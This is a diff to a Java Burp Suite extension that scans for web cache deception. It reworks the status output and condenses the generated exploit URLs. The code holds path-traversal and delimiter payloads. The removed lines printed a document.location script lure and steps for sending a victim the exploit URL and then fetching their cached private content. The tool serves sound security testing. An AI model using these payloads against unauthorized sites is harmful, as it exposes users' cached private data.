@@ -30,6 +30,15 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
     protected static void print(String str) {
         callbacks.printOutput(str);
     }
+    
+    protected static void updateStatus(String status) {
+        // Update status bar (overwrite previous line)
+        callbacks.printOutput("\r[WCD] " + status);
+    }
+    
+    protected static void printStatus(String status) {
+        callbacks.printOutput("[WCD] " + status);
+    }
 
     @Override
     public void registerExtenderCallbacks(IBurpExtenderCallbacks iBurpExtenderCallbacks) {
@@ -37,9 +46,7 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
         callbacks.setExtensionName("Web Cache Deception Scanner");
         callbacks.registerContextMenuFactory(this);
         callbacks.registerExtensionStateListener(this);
-        callbacks.printOutput("Web Cache Deception Scanner Version " + VERSION);
-        callbacks.printOutput("Original Author: Johan Snyman <jsnyman@trustwave.com>");
-        callbacks.printOutput("Updated for Burp Community Edition by: atomiczsec <gavin@atomiczsec.net>");
+        printStatus("Version " + VERSION + " loaded");
 
         helpers = iBurpExtenderCallbacks.getHelpers();
 
@@ -108,9 +115,13 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
         @Override
         public void run() {
             try {
+                String targetUrlStr = helpers.analyzeRequest(reqRes).getUrl().toString();
+                printStatus("Starting scan: " + targetUrlStr);
+                
                 // Initial path mapping check
+                updateStatus("Initializing...");
                 if (!RequestSender.initialTest(reqRes)) {
-                    print("Initial path mapping tests failed. Aborting further cache checks.");
+                    printStatus("Scan aborted: Initial path mapping tests failed");
                     return;
                 }
 
@@ -118,9 +129,6 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 if (randomSegment == null || randomSegment.isEmpty()) {
                     randomSegment = "test";
                 }
-
-                String targetUrlStr = helpers.analyzeRequest(reqRes).getUrl().toString();
-                print("\n--- Starting WCD Scan for " + reqRes.getHttpService().toString() + targetUrlStr + " ---");
                 
                 // Result storage
                 Map<String, Set<String>> vulnerableDelimiterCombinations = new HashMap<>();
@@ -133,7 +141,7 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 String successfulTraversalPath = null;
 
                 // Test Self-Referential Normalization
-                print("Testing Self-Referential Path Normalization...");
+                updateStatus("Testing self-referential normalization...");
                 List<String> targetRelativeSegments = Arrays.asList(
                     "resources/", "static/", "css/", "js/", "images/", "public/", "assets/",
                     "api/", "media/", "uploads/", "content/", "files/", "data/"
@@ -144,7 +152,6 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                     Map<String, String> successfulSegmentsForDelimiter = new HashMap<>();
                     for (String segment : targetRelativeSegments) {
                         if (RequestSender.testSelfReferentialNormalization(reqRes, delimiter, segment)) {
-                            print("  [HIT] Self-Referential: Delimiter='" + delimiter + "', Segment='" + segment + "'");
                             successfulSegmentsForDelimiter.put(segment, "..%2f");
                             break;
                         }
@@ -155,7 +162,7 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 }
 
                 // Test Hash Path Traversal
-                print("Testing hash-based path traversal...");
+                updateStatus("Testing hash-based traversal...");
                 String[] traversalPatterns = {
                     "%2f%2e%2e%2f", "%2f..%2f", "%252f%252e%252e%252f", "/%2e%2e/", "%2f%2e%2e"
                 };
@@ -169,28 +176,26 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                         if (RequestSender.testHashPathTraversal(reqRes, resource, traversalPattern)) {
                             hashTraversalVulnerable = true;
                             successfulTraversalPath = traversalPattern + resource;
-                            print("  [HIT] Hash Path Traversal: %23" + successfulTraversalPath);
                             break;
                         }
                     }
                 }
 
                 // Test Delimiter + Extensions
-                print("Testing Delimiter + Extensions...");
+                updateStatus("Testing delimiter + extensions...");
                 List<String> allExtensions = new ArrayList<>(Arrays.asList(RequestSender.INITIAL_TEST_EXTENSIONS));
                 allExtensions.addAll(Arrays.asList(RequestSender.OTHER_TEST_EXTENSIONS));
 
                 for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                     for (String extension : allExtensions) {
                         if (RequestSender.testDelimiterExtension(reqRes, randomSegment, extension, delimiter)) {
-                            print("  [HIT] Delimiter+Extension: Delimiter='" + delimiter + "', Extension=." + extension);
                             vulnerableDelimiterCombinations.computeIfAbsent(delimiter, k -> new HashSet<>()).add(extension);
                         }
                     }
                 }
 
                 // Test Path Normalization
-                print("Testing Path Normalization...");
+                updateStatus("Testing path normalization...");
                 List<String> knownPaths = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PATHS);
                 List<String> normalizationTemplates = Arrays.asList(RequestSender.NORMALIZATION_TEMPLATES);
                 
@@ -199,7 +204,6 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                     for (String knownPath : knownPaths) {
                         for (String template : normalizationTemplates) {
                             if (RequestSender.testNormalizationCaching(reqRes, delimiter, knownPath, template)) {
-                                print("  [HIT] Normalization: Delimiter='" + delimiter + "', Template=" + template + ", Path=" + knownPath);
                                 successfulPathsForDelimiter.put(knownPath, template);
                             }
                         }
@@ -210,22 +214,20 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 }
 
                 // Test Relative Path Normalization
-                print("Testing Relative Path Normalization...");
+                updateStatus("Testing relative normalization...");
                 String specificRelativePath = "%2f%2e%2e%2frobots.txt";
                 for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                     if (RequestSender.testRelativeNormalizationExploit(reqRes, delimiter, specificRelativePath)) {
-                        print("  [HIT] Relative Normalization: Delimiter='" + delimiter + "', Path=" + specificRelativePath);
                         successfulRelativeExploits.put(delimiter, specificRelativePath);
                     }
                 }
 
                 // Test Prefix Normalization
-                print("Testing Prefix Normalization...");
+                updateStatus("Testing prefix normalization...");
                 List<String> knownPrefixes = Arrays.asList(RequestSender.KNOWN_CACHEABLE_PREFIXES);
                 for (String delimiter : Arrays.asList("/", ";", "?", "%23", "%3f")) {
                     for (String prefix : knownPrefixes) {
                         if (RequestSender.testPrefixNormalizationExploit(reqRes, delimiter, prefix)) {
-                            print("  [HIT] Prefix Normalization: Delimiter='" + delimiter + "', Prefix=" + prefix);
                             successfulPrefixExploits.put(delimiter, prefix);
                             break;
                         }
@@ -233,18 +235,18 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 }
 
                 // Test Reverse Traversal
-                print("Testing Reverse Path Traversal...");
+                updateStatus("Testing reverse traversal...");
                 String[] reverseTraversalPaths = {
                     "/resources/", "/static/", "/assets/", "/css/", "/js/", "/images/", "/public/"
                 };
                 for (String cachePath : reverseTraversalPaths) {
                     if (RequestSender.testReverseTraversal(reqRes, cachePath)) {
-                        print("  [HIT] Reverse Traversal: Path='" + cachePath + "'");
                         successfulReverseTraversals.put(cachePath, "");
                     }
                 }
 
                 // Report findings
+                updateStatus("Analyzing results...");
                 boolean anyHits = !successfulSelfRefExploits.isEmpty() || 
                                 hashTraversalVulnerable || 
                                 !vulnerableDelimiterCombinations.isEmpty() || 
@@ -255,7 +257,6 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
 
                 if (anyHits) {
                     WebCacheIssue issue = new WebCacheIssue(reqRes);
-                    // Set vulnerable extensions for the issue
                     Set<String> allVulnerableExtensions = new HashSet<>();
                     for (Set<String> extensions : vulnerableDelimiterCombinations.values()) {
                         allVulnerableExtensions.addAll(extensions);
@@ -264,10 +265,7 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                         issue.setVulnerableExtensions(allVulnerableExtensions);
                     }
                     
-                    print("\n+++ Web Cache Deception Vulnerability Found +++");
-                    print("Target URL: " + issue.getUrl().toString());
-                    
-                    // Generate detailed exploit information
+                    printStatus("VULNERABILITY FOUND: " + targetUrlStr);
                     generateExploitDetails(reqRes, successfulSelfRefExploits, hashTraversalVulnerable, 
                                          successfulTraversalPath, vulnerableDelimiterCombinations, 
                                          successfulNormalizationDetails, successfulPrefixExploits, 
@@ -275,11 +273,11 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                     
                     callbacks.addScanIssue(issue);
                 } else {
-                    print("\n--- No Web Cache Deception Vulnerabilities Found ---");
+                    printStatus("No vulnerabilities found: " + targetUrlStr);
                 }
 
             } catch (Throwable t) {
-                print("ERROR during scan: " + t.getMessage());
+                printStatus("ERROR: " + t.getMessage());
                 t.printStackTrace(new PrintStream(callbacks.getStderr()));
             }
         }
@@ -298,144 +296,68 @@ public class BurpExtender implements IBurpExtender, IContextMenuFactory, IExtens
                 baseUrl = baseUrl.substring(0, baseUrl.indexOf("?"));
             }
             
-            print("\n=== EXPLOIT DETAILS ===");
+            int exploitCount = 0;
+            StringBuilder summary = new StringBuilder();
             
-            // Self-Referential Normalization Exploits (Highest Priority)
+            // Self-Referential Normalization Exploits
             if (!successfulSelfRefExploits.isEmpty()) {
-                print("\n[HIGH PRIORITY] Self-Referential Path Normalization Exploit Found!");
-                
                 String firstDelim = successfulSelfRefExploits.keySet().iterator().next();
                 Map<String, String> segmentMap = successfulSelfRefExploits.get(firstDelim);
                 String segment = segmentMap.keySet().iterator().next();
-                String traversalPattern = segmentMap.get(segment);
-                
-                // Extract target filename
                 String targetPath = helpers.analyzeRequest(reqRes).getUrl().getPath();
                 String targetFilename = extractFilename(targetPath);
-                
-                String exploitPath = segment + traversalPattern + targetFilename;
-                String cacheBuster = RequestSender.generateRandomString(4);
-                String exploitUrl = baseUrl + firstDelim + exploitPath + "?wcd=" + cacheBuster;
-                
-                print("  Vulnerability Type: Self-Referential Path Normalization");
-                print("  Delimiter: '" + firstDelim + "'");
-                print("  Intermediate Segment: '" + segment + "'");
-                print("  Traversal Pattern: '" + traversalPattern + "'");
-                print("  Target File: '" + targetFilename + "'");
-                print("");
-                print("  EXPLOIT URL: " + exploitUrl);
-                print("");
-                print("  EXPLOIT SERVER PAYLOAD:");
-                print("  <script>document.location='" + exploitUrl + "'</script>");
-                print("");
-                print("  MANUAL TESTING STEPS:");
-                print("  1. Send victim the exploit URL above");
-                print("  2. Within 30 seconds, request: " + baseUrl + firstDelim + exploitPath + "?wcd=" + cacheBuster);
-                print("  3. Check if cached sensitive content is returned");
-                print("");
+                String exploitPath = segment + segmentMap.get(segment) + targetFilename;
+                String exploitUrl = baseUrl + firstDelim + exploitPath + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[HIGH] Self-Referential: %s\n", exploitUrl));
+                exploitCount++;
             }
             
             // Hash Path Traversal Exploits
             if (hashTraversalVulnerable && successfulTraversalPath != null) {
-                print("\n[HIGH PRIORITY] Hash Path Traversal Exploit Found!");
-                
-                String cacheBuster = RequestSender.generateRandomString(4);
-                String exploitUrl = baseUrl + "%23" + successfulTraversalPath + "?wcd=" + cacheBuster;
-                
-                print("  Vulnerability Type: Hash-based Path Traversal");
-                print("  Traversal Path: " + successfulTraversalPath);
-                print("");
-                print("  EXPLOIT URL: " + exploitUrl);
-                print("");
-                print("  EXPLOIT SERVER PAYLOAD:");
-                print("  <script>document.location='" + exploitUrl + "'</script>");
-                print("");
-                print("  MANUAL TESTING STEPS:");
-                print("  1. Send victim the exploit URL above");
-                print("  2. Within 30 seconds, request: " + exploitUrl);
-                print("  3. Check if cached sensitive content is returned");
-                print("");
-            }
-            
-            // Relative Path Normalization Exploits
-            if (!successfulRelativeExploits.isEmpty()) {
-                print("\n[MEDIUM PRIORITY] Relative Path Normalization Exploit Found!");
-                
-                String firstDelim = successfulRelativeExploits.keySet().iterator().next();
-                String relativePath = successfulRelativeExploits.get(firstDelim);
-                String cacheBuster = RequestSender.generateRandomString(4);
-                String exploitUrl = baseUrl + firstDelim + relativePath + "?wcd=" + cacheBuster;
-                
-                print("  Vulnerability Type: Relative Path Normalization");
-                print("  Delimiter: '" + firstDelim + "'");
-                print("  Relative Path: " + relativePath);
-                print("");
-                print("  EXPLOIT URL: " + exploitUrl);
-                print("");
-                print("  EXPLOIT SERVER PAYLOAD:");
-                print("  <script>document.location='" + exploitUrl + "'</script>");
-                print("");
-            }
-            
-            // Delimiter + Extension Exploits
-            if (!vulnerableDelimiterCombinations.isEmpty()) {
-                print("\n[MEDIUM PRIORITY] Delimiter + Extension Exploits Found!");
-                
-                for (Map.Entry<String, Set<String>> entry : vulnerableDelimiterCombinations.entrySet()) {
-                    String delimiter = entry.getKey();
-                    Set<String> extensions = entry.getValue();
-                    
-                    for (String ext : extensions) {
-                        String cacheBuster = RequestSender.generateRandomString(4);
-                        String exploitUrl = baseUrl + delimiter + "test." + ext + "?wcd=" + cacheBuster;
-                        
-                        print("  Delimiter: '" + delimiter + "', Extension: ." + ext);
-                        print("  EXPLOIT URL: " + exploitUrl);
-                        print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
-                        break; // Show only first extension per delimiter
-                    }
-                }
-                print("");
-            }
-            
-            // Prefix Normalization Exploits
-            if (!successfulPrefixExploits.isEmpty()) {
-                print("\n[MEDIUM PRIORITY] Prefix Normalization Exploits Found!");
-                
-                for (Map.Entry<String, String> entry : successfulPrefixExploits.entrySet()) {
-                    String delimiter = entry.getKey();
-                    String prefix = entry.getValue();
-                    String normalizedPrefix = prefix.startsWith("/") ? prefix.substring(1) : prefix;
-                    String cacheBuster = RequestSender.generateRandomString(4);
-                    String exploitUrl = baseUrl + delimiter + "%2f%2e%2e%2f" + normalizedPrefix + "?wcd=" + cacheBuster;
-                    
-                    print("  Delimiter: '" + delimiter + "', Prefix: " + prefix);
-                    print("  EXPLOIT URL: " + exploitUrl);
-                    print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
-                    break; // Show only first one
-                }
-                print("");
+                String exploitUrl = baseUrl + "%23" + successfulTraversalPath + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[HIGH] Hash Traversal: %s\n", exploitUrl));
+                exploitCount++;
             }
             
             // Reverse Traversal Exploits
             if (!successfulReverseTraversals.isEmpty()) {
-                print("\n[HIGH PRIORITY] Reverse Path Traversal Exploits Found!");
-                
                 String targetPath = helpers.analyzeRequest(reqRes).getUrl().getPath();
                 String targetFilename = extractFilename(targetPath);
-                
-                for (Map.Entry<String, String> entry : successfulReverseTraversals.entrySet()) {
-                    String cachePath = entry.getKey();
-                    String cacheBuster = RequestSender.generateRandomString(4);
-                    String exploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename) + "?wcd=" + cacheBuster;
-                    
-                    print("  Cache Path: " + cachePath);
-                    print("  Target File: " + targetFilename);
-                    print("  EXPLOIT URL: " + exploitUrl);
-                    print("  EXPLOIT PAYLOAD: <script>document.location='" + exploitUrl + "'</script>");
-                    break; // Show only first one
-                }
-                print("");
+                String cachePath = successfulReverseTraversals.keySet().iterator().next();
+                String exploitUrl = baseUrl.replace(targetPath, cachePath + "..%2f" + targetFilename) + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[HIGH] Reverse Traversal: %s\n", exploitUrl));
+                exploitCount++;
+            }
+            
+            // Delimiter + Extension Exploits
+            if (!vulnerableDelimiterCombinations.isEmpty()) {
+                Map.Entry<String, Set<String>> entry = vulnerableDelimiterCombinations.entrySet().iterator().next();
+                String ext = entry.getValue().iterator().next();
+                String exploitUrl = baseUrl + entry.getKey() + "test." + ext + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[MEDIUM] Delimiter+Ext: %s\n", exploitUrl));
+                exploitCount++;
+            }
+            
+            // Relative Path Normalization Exploits
+            if (!successfulRelativeExploits.isEmpty()) {
+                Map.Entry<String, String> entry = successfulRelativeExploits.entrySet().iterator().next();
+                String exploitUrl = baseUrl + entry.getKey() + entry.getValue() + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[MEDIUM] Relative Norm: %s\n", exploitUrl));
+                exploitCount++;
+            }
+            
+            // Prefix Normalization Exploits
+            if (!successfulPrefixExploits.isEmpty()) {
+                Map.Entry<String, String> entry = successfulPrefixExploits.entrySet().iterator().next();
+                String prefix = entry.getValue().startsWith("/") ? entry.getValue().substring(1) : entry.getValue();
+                String exploitUrl = baseUrl + entry.getKey() + "%2f%2e%2e%2f" + prefix + "?wcd=" + RequestSender.generateRandomString(4);
+                summary.append(String.format("[MEDIUM] Prefix Norm: %s\n", exploitUrl));
+                exploitCount++;
+            }
+            
+            if (exploitCount > 0) {
+                printStatus(String.format("Found %d exploit(s):", exploitCount));
+                print(summary.toString());
             }
         }
         
